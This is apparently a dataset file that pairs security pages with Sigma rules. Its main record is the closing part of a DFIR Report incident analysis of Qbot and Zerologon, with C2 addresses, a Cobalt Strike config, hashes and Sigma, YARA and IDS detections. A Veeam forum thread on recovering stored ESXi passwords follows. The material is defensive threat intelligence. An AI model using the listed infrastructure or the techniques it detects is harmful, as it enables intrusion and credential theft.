C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\n```\nLogName=Microsoft-Windows-System/Operational\nEventCode=17\nTaskCategory=Pipe Created (rule: PipeEvent)\n```\n\n### Command and Control\n\n#### QBot details – 24.229.150.54 // 41.228.22.180\n\n24.229.150[.]54:995 / avlhestito[.]us\n\n```\nCertificate: 25:a6:ef:79:48:98:54:ee:bb:a6:bd:10:ee:c1:f2:0a:00:ad:ac:ce\nNot Before  2021/11/15 09:24:49 UTC\nNot After  2022/11/15 13:18:32 UTC\nIssuer Org  Rsc Inpye LLC.\nSubject Common  avlhestito[.]us\nPublic Algorithm  rsaEncryption\nJA3: c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\n41.228.22[.]180:443 / xrhm[.]info\n\n```\nCertificate:\t96:39:a9:52:e9:9a:1e:29:c5:dc:b3:72:01:29:74:c4:87:db:15:d7\nNot \tBefore:  2021/11/12 04:34:10 UTC\nNot After:  \t2022/11/12 10:08:57 UTC\nIssuer Org:  Bqatra Bamito Inc.\nSubject Common:  xrhm[.]info\nPublic Algorithm:  rsaEncryption\nJA3:  c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\nHere is the initial access DLL (Qbot) information from Tria.ge\n\n```image\nAlt: Qbot DLL\nDescription: The image displays a table containing details about Qakbot (QBot) operations. It includes columns for Family, Version, Botnet, Campaign, and a list of Command and Control (C2) IP addresses with their corresponding ports. Each row represents a different C2 address associated with Qakbot, showcasing the botnet's operational infrastructure.\nTranscription: |\n  Family: qakbot\n  Version: 402.363\n  Botnet: tr\n  Campaign: 1633597626\n  \n  C2:\n  120.150.218.241:995\n  89.137.52.44:443\n  86.8.177.143:443\n  174.54.139.186:443\n  188.50.169.158:443\n  140.82.49.12:443\n  81.241.252.59:2078\n  209.50.20.255:443\n  200.232.214.222:995\n  2.222.167.138:443\n  122.11.220.212:2222\n  47.22.148.6:443\n  217.17.56.163:465\n  94.200.181.154:443\n  201.93.111.2:995\n  89.101.97.139:443\n  188.55.235.118:995\n  181.118.183.94:443\n  186.32.163.199:443\n  76.25.142.196:443\n  98.157.235.126:443\n  73.151.236.31:443\n  75.75.179.226:443\n  67.165.206.193:993\n  72.252.201.69:443\n  185.250.148.74:443\n  66.103.170.104:2222\n  216.201.162.158:443\n  103.123.42.115:2222\n  124.123.42.115:2222\n  199.27.127.129:443\n  209.142.97.161:995\n  73.236.205.91:443\n  103.142.10.177:443\n  41.228.22.180:443\n  78.191.58.219:995\n  74.72.237.54:443\n  96.57.188.174:2078\n  37.210.152.224:995\n  202.134.178.157:443\n  73.52.50.32:443\n  27.223.92.142:995\n  136.236.74.70:443\n  72.173.78.211:443\n  45.46.53.140:2222\n  173.21.10.71:2222\n  71.74.12.34:443\n  167.48.117.81:443\n  47.40.196.233:2222\n  181.4.53.6:465\n```\n\n#### Cobalt Strike details – 5.255.98[.]144\n\nThis Cobalt Strike server was added to our Threat Feed on 2021-11-16.\n\n5.255.98.144:8888 / 5.255.98.144:443 / 5.255.98.144:8080 / dxabt[.]com\n\n```\nCertificate: [25:fe:be:6d:0e:8d:48:5a:94:cf:46:84:d7:7e:ff:bf:47:aa:04:5c ]\nNot Before: 2021/11/07 03:00:53 UTC  \t\nNot After: 2022/02/05 03:00:52 UTC  \t\nIssuer Org: Let's Encrypt  \t\nSubject Common: dxabt[.]com [dxabt[.]com,ns1.dxabt[.]com,ns2.dxabt[.]com,ns3.dxabt[.]com,ns4.dxabt[.]com\nPublic Algorithm: rsaEncryption\nJA3: 0eecb7b1551fba4ec03851810d31743f\nJA3s: ae4edc6faf64d08308082ad26be60767\n```\n\nConfig:\n\n```\n{\n    \"x64\": {\n        \"uri_queried\": \"/tRPG\",\n        \"sha256\": \"dec25fc2fe7e76fe191fbfdf48588c4325f52bfe2769fbc88a5614541c1075eb\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416040175.3,\n        \"md5\": \"30cc71d5b5d7778774c54486558690d3\",\n        \"sha1\": \"5f36c6cffdbae0d631c8889b4d9bad1248f899b3\"\n    },\n    \"x86\": {\n        \"uri_queried\": \"/Mr0m\",\n        \"sha256\": \"a992d57b2f6164e599952ea3c245962824ad17166684ed45e987efe80ebe611f\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416038974.9,\n        \"md5\": \"c1fd49c043894c1dff8bc02b17f8942c\",\n        \"sha1\": \"e915f74be310b1687db6b290af2f78583a981512\"\n    }\n}\n```\n\n### Exfiltration\n\nWhile the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165. These alerts tell us that data was indeed exfiltrated from the environment.\n\n```image\nAlt: Canary Documents\nDescription: The image displays a code snippet featuring details about an IP address (91.193.182.165). It includes information such as city (Moscow), region (Moscow), country (RU), geographical coordinates, organization (AS12722 RECONN LLC), postal code (101000), and timezone (Europe/Moscow). This data is relevant for identifying the origin of suspicious activities in a cybersecurity context.\nTranscription: |\n  ip: \"91.193.182.165\"\n  city: \"Moscow\"\n  region: \"Moscow\"\n  country: \"RU\"\n  loc: \"55.7522,37.6156\"\n  org: \"AS12722 RECONN LLC\"\n  postal: \"101000\"\n  timezone: \"Europe/Moscow\"\n```\n\nThe threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.\n\nThe C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.\n\n```image\nAlt: C2 Channel\nDescription: The image is a bar graph depicting the number of connections per minute from a File Server to a specified command and control IP address (5.255.98.144:8888). The x-axis represents time in UTC from 17:35 to 18:15, while the y-axis indicates the number of connections, ranging from 0 to 20. The graph shows a notable spike in connections at 17:54, which aligns with the timeframe of suspected data exfiltration, demonstrating the activity of a Cobalt Strike Beacon during that period.\nTranscription: |\n  Number of connection to 5.255.98.144:8888 from File Server per minute\n  \n  | Time  | Connections |\n  |-------|-------------|\n  | 17:36 | 1           |\n  | 17:37 | 0           |\n  | 17:38 | 0           |\n  | 17:39 | 5           |\n  | 17:40 | 0           |\n  | 17:41 | 0           |\n  | 17:42 | 0           |\n  | 17:43 | 0           |\n  | 17:44 | 0           |\n  | 17:45 | 0           |\n  | 17:46 | 0           |\n  | 17:47 | 0           |\n  | 17:48 | 0           |\n  | 17:49 | 0           |\n  | 17:50 | 0           |\n  | 17:51 | 0           |\n  | 17:52 | 0           |\n  | 17:53 | 0           |\n  | 17:54 | 18          |\n  | 17:55 | 16          |\n  | 17:56 | 14          |\n  | 17:57 | 12          |\n  | 17:58 | 10          |\n  | 17:59 | 10          |\n  | 18:00 | 10          |\n  | 18:01 | 10          |\n  | 18:02 | 10          |\n  | 18:03 | 10          |\n  | 18:04 | 10          |\n  | 18:05 | 10          |\n  | 18:06 | 10          |\n  | 18:07 | 10          |\n  | 18:08 | 10          |\n  | 18:09 | 10          |\n  | 18:10 | 10          |\n  | 18:11 | 10          |\n  | 18:12 | 10          |\n```\n\nAt 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.\n\nAccording to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC.\n\n```image\nAlt: Exfiltration Traffic\nDescription: The image is a time series graph displaying network traffic data related to exfiltration events. The x-axis represents time in UTC, ranging from 17:52:00 to 18:00:00, while the y-axis indicates the volume of data transferred. A significant spike is visible around 17:54:00, indicating a peak in traffic from the file share server to the Cobalt Strike command and control server. The graph uses red bars to highlight the data transfer volumes, suggesting a concentrated effort of data exfiltration occurring within this time frame.\nTranscription: |\n  | Time (UTC) | Connections |\n  |------------|-------------|\n  | 17:52:00   | Low         |\n  | 17:54:00   | High        |\n  | 17:56:00   | Low         |\n  | 17:58:00   | Low         |\n  | 18:00:00   | Low         |\n```\n\nSpike in traffic from file share server to Cobalt Strike command and control server.\n\n### IOCs\n\n#### Network\n\n```\nQBOT\n24.229.150[.]54:995  - avlhestito[.]us\n41.228.22[.]180:443 - xrhm[.]info\n\nCobalt Strike\n5.255.98[.]144:8888 / dxabt[.]com\n5.255.98[.]144:443 / dxabt[.]com\n5.255.98[.]144:8080 / dxabt[.]com\n```\n\n#### File\n\n```\nIntial Exec Qbot DLL\nMD5:53510e20efb161d5b71c4ce2800c1a8d\nSHA1:2268178851d0d0debb9ab457d73af8a5e50af168\nSHA2:e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\n\nQBot DLL (extracted from registry):\nMD5:312e52b4109741893f17bc524084100f\nSHA1:7ca650945223eab088f43fd472e3592be2ed9d32\nSHA2:4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\n\ncool.exe\nMD5:59E7F22D2C290336826700F05531BD30\nSHA1:3B2A0D2CB8993764A042E8E6A89CBBF8A29D47D1\nSHA256:F63E17FF2D3CFE75CF3BB9CF644A2A00E50AAFFE45C1ADF2DE02D5BD0AE35B0\n```\n\n## Detections\n\n### Network\n\n```\nET POLICY Powershell Activity Over SMB - Likely Lateral Movement\nET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\nET CNC Feodo Tracker Reported CnC Server group 15\nET CNC Feodo Tracker Reported CnC Server group 16\n\nThe following rules may cause performance issues (and are disabled by default) according to @ET_Labs\nET EXPLOIT Possible Zerologon NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) - 2030870\nET EXPLOIT Possible Zerologon NetrServerAuthenticate with 0x00 Client Credentials (CVE-2020-1472) 2030871\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) UUID flowbit set - 2030888\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) M2 - 2030889\n```\n\nNew signatures\n\n```\n2035258 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035259 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035260 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035261 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035262 - ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)\n2035263 - ET EXPLOIT Zerologon Phase 3/3 - NetrLogonSamLogonWithFlags Request with 0x00 Client Credentials (CVE-2020-1472)\n```\n\n### Sigma\n\n```\ntitle: Scheduled task executing powershell encoded payload from registry\nstatus: Experimental\ndescription: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith: '\\schtasks.exe'\n    CommandLine|contains|all:\n      - '/Create'\n      - '/SC'\n  selection2:\n    CommandLine|contains|all:\n      - 'FromBase64String'\n      - 'powershell'\n      - 'Get-ItemProperty'\n      - 'HKCU:'\n  condition: selection1 and selection2\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.t1053.005\n  - attack.t1059.001\n```\n\n```\ntitle: Execution of ZeroLogon PoC executable\nstatus: Experimental\ndescription: Detects the execution of the commonly used ZeroLogon PoC executable.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    ParentImage|endswith:\n      - '\\cmd.exe'\n    Image|endswith:\n      - '\\cool.exe'\n      - '\\zero.exe'\n    CommandLine|contains|all:\n      - 'Administrator'\n      - '-c'\n  selection2:\n    CommandLine|contains|all:\n      - 'taskkill'\n      - '/f'\n      - '/im'\n  selection3:\n    CommandLine|contains:\n      - 'powershell'\n  condition: selection1 and (selection2 or selection3)\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.lateral_movement\n  - attack.T1210\n```\n\n```\ntitle:  Enabling RDP service via reg.exe command execution\nstatus: Experimental\ndescription: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith:\n      - '\\reg.exe'\n    CommandLine|contains|all:\n      - 'add'\n      - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server'\n      - 'REG_DWORD'\n  Winstations1:\n    CommandLine|contains:\n      - 'WinStations\\RDP-Tcp'\n  Winstations2:\n    CommandLine|contains:\n      - 'MaxInstanceCount'\n      - 'fEnableWinStation'\n  selection2:\n    CommandLine|contains|all:\n      - 'Licensing Core'\n      - 'EnableConcurrentSessions'\n  selection3:\n    CommandLine|contains:\n      - 'TSUserEnabled'\n      - 'TSEnabled'\n      - 'TSAppCompat'\n      - 'IdleWinStationPoolCount'\n      - 'TSAdvertise'\n      - 'AllowTSConnections'\n      - 'fSingleSessionPerUser'\n  condition: selection1 and ((Winstations1 and Winstations2) or (selection2 or selection3))\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.defense_evasion\n  - attack.lateral_movement\n  - attack.t1021.001\n  - attack.t1112\n```\n\n- https://github.com/SigmaHQ/sigma/blob/a502f316efdcc8c174b7cf412029dfae5b3552c8/rules/windows/builtin/security/win_pass_the_hash_2.yml\n- https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml\n- https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml\n- https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_nltest_recon.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_susp_whoami.yml\n\n### Yara\n\n```\n/*\n   YARA Rule Set\n   Author: The DFIR Report\n   Date: 2022-02-20\n   Identifier: Case 8734\n   Reference: https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule qbot_8734_payload_dll {\n   meta:\n      description = \"files - file e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n      author = \"The DFIR Report\"\n      reference = \"https://thedfirreport.com\"\n      date = \"2022-02-20\"\n      hash1 = \"e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n   strings:\n      $s1 = \"Terfrtghygine.dll\" fullword ascii\n      $s2 = \"Winamp can read extended metadata for titles. Choose when this happens:\" fullword wide /* Goodware String - occured 1 times */\n      $s3 = \"Read metadata when file(s) are loaded into Winamp\" fullword wide /* Goodware String - occured 1 times */\n      $s4 = \"Use advanced title formatting when possible\" fullword wide /* Goodware String - occured 1 times */\n      $s5 = \"PQVW=!?\" fullword ascii\n      $s6 = \"Show underscores in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s7 = \"Advanced title display format :\" fullword wide /* Goodware String - occured 1 times */\n      $s8 = \"CreatePaint\" fullword ascii\n      $s9 = \"PQRVW=2\\\"\" fullword ascii\n      $s10 = \"Advanced Title Formatting\" fullword wide /* Goodware String - occured 1 times */\n      $s11 = \"Read metadata when file(s) are played or viewed in the playlist editor\" fullword wide /* Goodware String - occured 1 times */\n      $s12 = \"Show '%20's in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s13 = \"Example : \\\"%artist% - %title%\\\"\" fullword wide /* Goodware String - occured 1 times */\n      $s14 = \"PQRVW=g\" fullword ascii\n      $s15 = \"PQRW=e!\" fullword ascii\n      $s16 = \"ATF Help\" fullword wide /* Goodware String - occured 1 times */\n      $s17 = \"(this can be slow if a large number of files are added at once)\" fullword wide /* Goodware String - occured 1 times */\n      $s18 = \"PQRVW=$\" fullword ascii\n      $s19 = \"Metadata Reading\" fullword wide /* Goodware String - occured 1 times */\n      $s20 = \"Other field names: %artist%, %album%, %title%, %track%, %year%, %genre%, %comment%, %filename%, %disc%, %rating%, ...\" fullword wide /* Goodware String - occured 1 times */\n   condition:\n      uint16(0) == 0x5a4d and filesize < 2000KB and\n      ( pe.imphash() == \"aa8a9db10fba890f8ef9edac427eab82\" and pe.exports(\"CreatePaint\") or 8 of them )\n}\n\nrule qbot_dll_8734 {\n   meta:\n      description = \"files - qbot.dll\"\n      author = \"TheDFIRReport\"\n      reference = \"QBOT_DLL\"\n      date = \"2021-12-04\"\n      hash1 = \"4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\"\n   strings:\n      $s1 = \"Execute not supported: %sfField '%s' is not the correct type of calculated field to be used in an aggregate, use an internalcalc\" wide\n      $s2 = \"IDAPI32.DLL\" fullword ascii\n      $s3 = \"ResetUsageDataActnExecute\" fullword ascii\n      $s4 = \"idapi32.DLL\" fullword ascii\n      $s5 = \"ShowHintsActnExecute\" fullword ascii\n      $s6 = \"OnExecute@iG\" fullword ascii\n      $s7 = \"OnExecutexnD\" fullword ascii\n      $s8 = \"ShowShortCutsInTipsActnExecute\" fullword ascii\n      $s9 = \"ResetActnExecute \" fullword ascii\n      $s10 = \"RecentlyUsedActnExecute\" fullword ascii\n      $s11 = \"LargeIconsActnExecute\" fullword ascii\n      $s12 = \"ResetActnExecute\" fullword ascii\n      $s13 = \"OnExecute<\" fullword ascii\n      $s14 = \"TLOGINDIALOG\" fullword wide\n      $s15 = \"%s%s:\\\"%s\\\";\" fullword ascii\n      $s16 = \":\\\":&:7:?:C:\\\\:\" fullword ascii /* hex encoded string '|' */\n      $s17 = \"LoginPrompt\" fullword ascii\n      $s18 = \"TLoginDialog\" fullword ascii\n      $s19 = \"OnLogin\" fullword ascii\n      $s20 = \"Database Login\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 3000KB and\n      8 of the\n```\n\n## MITRE\n\n- Exploitation for Privilege Escalation – T1068\n- Service Execution – T1569.002\n- Network Share Discovery – T1135\n- Pass the Hash – T1550.002\n- PowerShell – T1059.001\n- Windows Command Shell – T1059.003\n- Network Share Discovery – T1135\n- Obfuscated Files or Information – T1027\n- Scheduled Task – T1053.005\n- Process Injection – T1055\n- Remote System Discovery – T1018\n- Obfuscated Files or Information – T1027\n- Domain Trust Discovery – T1482\n- Domain Groups – T1069.002\n- System Owner/User Discovery – T1033\n- Network Share Discovery – T1135\n- Remote Services – T1021\n- Local Account – T1087.001\n- Security Software Discovery – T1518.001\n\n```image\nAlt: MITRE ATT&CK\nDescription: The image is a flowchart detailing the relationships and tactics used in a cyber attack scenario involving Qbot and Zerologon. It is structured according to the MITRE ATT&CK framework, illustrating various tactics and techniques such as initial access, execution, privilege escalation, lateral movement, discovery, command and control, and exfiltration. Each tactic is accompanied by specific techniques and associated tools, such as Cobalt Strike, PowerShell, and others. The flowchart visually organizes these components, highlighting how they connect to lead to a full domain compromise.\nTranscription: |\n  TA0001: Initial Access\n      T1566.001: Phishing: Spearphishing Attachment -> Qbot\n  \n  TA0002: Execution\n      T1059.001: Command and Scripting Interpreter: PowerShell\n      T1059.003: Command and Scripting Interpreter: Windows Command Shell -> Cobalt Strike\n      T1569: System Services\n  \n  TA0004: Privilege Escalation\n      T1078.002: Valid Accounts: Domain Accounts\n      T1086: Exploitation for Privilege Escalation -> Zerologon\n  \n  TA0005: Defense Evasion\n      T1055: Process Injection -> Cobalt Strike\n  \n  TA0003: Persistence\n      T1053.005: Scheduled Task/Job: Scheduled Task\n  \n  TA0008: Lateral Movement\n      T1021.002: Remote Services: SMB/Windows Admin Shares -> Cobalt Strike\n      T1021.001: Remote Services: Remote Desktop Protocol\n  \n  TA0007: Discovery\n      T1518.001: Software Discovery: Security Software Discovery -> wmic\n      T1018: Remote System Discovery -> Ping\n      T1087.002: Account Discovery: Domain Account -> ADFind\n      T1135: Network Share Discovery -> Net View\n      T1069.001: Permission Groups Discovery: Local Groups\n      T1069: Permission Groups Discovery: Domain Groups -> Net Group\n      T1482: Domain Trust Discovery -> Ntest\n  \n  TA0011: Command and Control\n      T1071: Application Layer Protocol -> Cobalt Strike and Qbot\n  \n  TA0010: Exfiltration\n      T1041: Exfiltration over C2 Channel -> Documents from File Share Server and Cobalt Strike\n```",
    "sigma_rule": {
      "title": "Scheduled Task Executing Encoded Payload from Registry",
      "id": "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
      "status": "test",
      "description": "Detects the creation of a schtask that potentially executes a base64 encoded payload stored in the Windows Registry using PowerShell.",
      "references": [
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "pH-T (Nextron Systems), @Kostastsale, TheDFIRReport, X__Junior (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-02-12",
      "modified": "2023-02-04",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1053.005",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\schtasks.exe"
          },
          {
            "OriginalFileName": "schtasks.exe"
          }
        ],
        "selection_cli_create": {
          "CommandLine|contains": "/Create"
        },
        "selection_cli_encoding": {
          "CommandLine|contains": [
            "FromBase64String",
            "encodedcommand"
          ]
        },
        "selection_cli_get": {
          "CommandLine|contains": [
            "Get-ItemProperty",
            " gp "
          ]
        },
        "selection_cli_hive": {
          "CommandLine|contains": [
            "HKCU:",
            "HKLM:",
            "registry::",
            "HKEY_"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_reg_loader_encoded.yml",
    "id": "481"
  },
  {
    "url": "https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html",
    "markdown": "# Recover ESXi password in Veeam\n\n## vmNik (Novice)\n\n**Posts:** 6\n**Joined:** Apr 10, 2015 12:14 am\n\n### Recover ESXi password in Veeam\n\nGood morning.\n\nIs it possible to view/recover via SQL a password for an ESXi host attached to VBR? A remote host password has been forgotten but has a Veeam system in place there, attached with the ESXi host in question and able to backup, restore, etc. Looking at SQL table `[dbo.Credentials]` in VBR8, the list of users is shown. Is there a means to get a password from SQL?\n\nThank you.\n\n**Signature:**\nVCP5-DCV\n\n---\n\n## nielsengelen (Product Manager)\n\n**Posts:** 5768\n**Joined:** Jul 15, 2013 11:09 am\n\n### Re: Recover ESXi password in Veeam\n\nYou can't recover passwords from the database.\n\n**Signature:**\nPersonal blog: https://foonet.be\nGitHub: https://github.com/nielsengelen\n\n---\n\n## Gostev (Chief Product Officer)\n\n**Posts:** 31700\n**Joined:** Jan 01, 2006 1:01 am\n\n### Re: Recover ESXi password in Veeam\n\nCorrect, using the product UI you certainly cannot look up stored passwords.\n\nBut the code itself obviously can do this (to be able to actually leverage those credentials), so generally speaking, it is doable. But it is a manual procedure that has to be performed on the backup server using some system calls. Our support can do this for you (ask them to ask me if they've never done it before).\n\n---\n\n## omfk (Expert)\n\n**Posts:** 110\n**Joined:** Nov 30, 2016 9:48 pm\n\n### [MERGED] Recover password for CIFS share\n\nHello,\n\nIs there a way to recover the password which I set for giving B&R for a copy job towards a CIFS share?\n\nBR,\nFrank\n\n---\n\n## PTide (Product Manager)\n\n**Posts:** 6532\n**Joined:** May 19, 2015 1:46 pm\n\n### [MERGED] Re: Recover password for CIFS share\n\nHi,\n\nUnfortunately, that is not possible from the UI, however, you can contact our support team and ask them to help you.\n\nThanks.\n\n---\n\n## omfk (Expert)\n\n**Posts:** 110\n**Joined:** Nov 30, 2016 9:48 pm\n\n### Re: [MERGED] Re: Recover password for CIFS share\n\nThanks for the reply. I'll give it a try on Monday.\n\n---\n\n## omfk (Expert)\n\n**Posts:** 110\n**Joined:** Nov 30, 2016 9:48 pm\n\n### Re: [MERGED] Re: Recover password for CIFS share\n\nThe answer from the support team was negative:\n\"Unfortunately it's not possible to recover passwords from Veeam B&R 9.5. Passwords stored in Veeam are encrypted and it's not possible to recover them.\"\n\nCorrect or not?\n\nBR,\nFrank\n\n---\n\n## Gostev (Chief Product Officer)\n\n**Posts:** 31700\n**Joined:** Jan 01, 2006 1:01 am\n\n### Re: Recover ESXi password in Veeam\n\nNot correct, but it is possible that they simply misunderstood your inquiry, and thought that you are talking about backup file password (and not ESXi host password).\n\n---\n\n## omfk (Expert)\n\n**Posts:** 110\n**Joined:** Nov 30, 2016 9:48 pm\n\n### Re: Recover ESXi password in Veeam\n\nI replied to their email with a picture showing the dialog in question. I'll keep you informed.\n\nVeeam Support - Case # 02067079\n\nBR,\nFrank\n\n---\n\n## omfk (Expert)\n\n**Posts:** 110\n**Joined:** Nov 30, 2016 9:48 pm\n\n### Re: Recover ESXi password in Veeam\n\nUpdate:\nI had a remote session with Veeam support and using a PowerShell script it was possible to display the password(s) in question.\n\nThx again,\nFrank\n\n---\n\n## peter84 (Service Provider)\n\n**Posts:** 2\n**Joined:** Dec 28, 2015 3:27 pm\n\n### [MERGED] Get ESX password out off Veeam\n\nHello,\n\nThe backup on our ESX host is running fine at this moment. But my colleague forgot to save our ESX password in our database. So is it possible to get the password out of Veeam?\n\n---\n\n## DGrinev (Veteran)\n\n**Posts:** 1943\n**Joined:** Dec 01, 2016 3:49 pm\n\n### Re: Get ESX password out off Veeam\n\nHi Peter and welcome to the community!\n\nYou cannot do that yourself using Veeam Backup & Replication UI, however, if you open a support case our team should be able to assist you with this task. Thanks!\n\n---\n\n## signal (Enthusiast)\n\n**Posts:** 65\n**Joined:** Oct 06, 2016 1:19 pm\n\n### Re: Recover ESXi password in Veeam\n\nFrom a security perspective, how are the passwords stored?\nAre they encrypted?\nI see them in the database, they are not in cleartext, but different passwords share some similar characteristics, so it can't be any form of strong encryption as that would and should produce dissimilar strings.\n\n---\n\n## Gostev (Chief Product Officer)\n\n**Posts:** 31700\n**Joined:** Jan 01, 2006 1:01 am\n\n### Re: Recover ESXi password in Veeam\n\nWe do use strong encryption of Microsoft CryptoAPI to encrypt passwords using machine-specific encryption key, which is an industry-standard approach. It basically guarantees that the decryption can only be performed on the specific machine, so there's no need to worry if someone steals the configuration database, or takes a picture of those values, etc. Thanks!\n\n---\n\n## signal (Enthusiast)\n\n**Posts:** 65\n**Joined:** Oct 06, 2016 1:19 pm\n\n### Re: Recover ESXi password in Veeam\n\nWhich CSP is used?\nWhich algorithm and key length is used?\n\n---\n\n## Gostev (Chief Product Officer)\n\n**Posts:** 31700\n**Joined:** Jan 01, 2006 1:01 am\n\n### Re: Recover ESXi password in Veeam\n\nAs a matter of fact, we operate \"on a higher level\" by simply using ProtectedData.Protect method of CryptoAPI to encrypt those credentials, so we don't have to deal with CSP, algorithm and key length. Not sure what Microsoft uses under the hood for those, but if it was not strong encryption - then CryptoAPI would not be FIPS-certified 😁\n\n---\n\n## bolnetworks (Influencer)\n\n**Posts:** 13\n**Joined:** Aug 03, 2010 11:39 am\n\n### Re: Recover ESXi password in Veeam\n\nWe have the same issue. Can you recover the password for us also? I've contacted support and they told me to write a reply in this topic.\n\n---\n\n## veremin (Product Manager)\n\n**Posts:** 20353\n**Joined:** Oct 26, 2012 3:28 pm\n\n### Re: Recover ESXi password in Veeam\n\nIt's support team that performs password recovery, not the team behind these forums. You might refer to the previously reported ticket 